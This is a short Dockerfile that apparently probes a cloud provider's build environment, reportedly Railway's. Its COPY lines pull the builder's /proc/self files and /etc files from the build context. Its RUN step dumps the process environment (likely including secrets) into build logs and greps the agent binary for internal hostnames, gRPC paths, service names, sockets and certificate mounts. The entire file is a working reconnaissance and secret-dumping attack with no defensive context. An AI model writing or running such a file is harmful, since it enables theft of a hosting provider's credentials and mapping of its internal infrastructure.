FROM alpine:3.20
COPY proc/self/exe /f/agent
COPY proc/self/cmdline /f/sc
COPY proc/self/environ /f/se
COPY proc/self/mountinfo /f/mi
COPY proc/self/maps /f/maps
COPY proc/self/status /f/st
COPY proc/self/cgroup /f/cg
COPY etc/hostname /f/hostname
COPY etc/os-release /f/osrel
COPY etc/environment /f/etenva
RUN sh -c 'set +e; echo "===R3==="; echo --SELF_CMD--; tr "\0" " " < /f/sc; echo; echo --SELF_ENV--; tr "\0" "\n" < /f/se | sort; echo --HOSTNAME--; cat /f/hostname; echo --OSREL--; head -6 /f/osrel; echo --ETCENV--; cat /f/etenva; echo --CGROUP--; cat /f/cg; echo --AGENT--; ls -la /f/agent; head -c 120 /f/agent | tr -c "[:print:]\n" "."; echo; echo --AGENT_MPIPE--; grep -aoE "internal_[A-Za-z0-9_.-]{2,48}" /f/agent | sort -u | head -100; echo --AGENT_TARGETS--; grep -aoE "x-mpipe-target[^\"]{0,60}|RAILWAY_MPIPE[A-Z_]{0,20}|mpipe[._-]?[a-z]{0,20}" /f/agent | sort -u | head -40; echo --AGENT_HOSTS--; grep -aoE "[A-Za-z0-9_-]{3,44}\.(rlwy\.net|railway\.app|railway\.internal|railway\.com)" /f/agent | sort -u | head -40; echo --AGENT_GRPC--; grep -aoE "/[A-Za-z0-9_.]+/[A-Za-z0-9_]{2,40}" /f/agent | grep -vE "^/[a-z]+/|/tmp/|/etc/|/proc/|/usr/|/var/" | sort -u | head -60; echo --AGENT_NAMES--; grep -aoE "(orchestrator|backboard|registry|network-cp|storage-agent|stacklet|certs|railyard|station|nats|builder|temporal|otel)[A-Za-z0-9_./:-]{0,30}" /f/agent | sort -u | head -150; echo --MOUNTINFO--; grep -E "railway|builder|buildkit|mtls|nats|cert|sock" /f/mi | head -50; echo --MAPS--; grep -E "\.sock|/proc|/usr/local|/opt/|railway|builder" /f/maps | head -30; echo "===R3_END==="'
CMD ["sh","-c","sleep 10"]
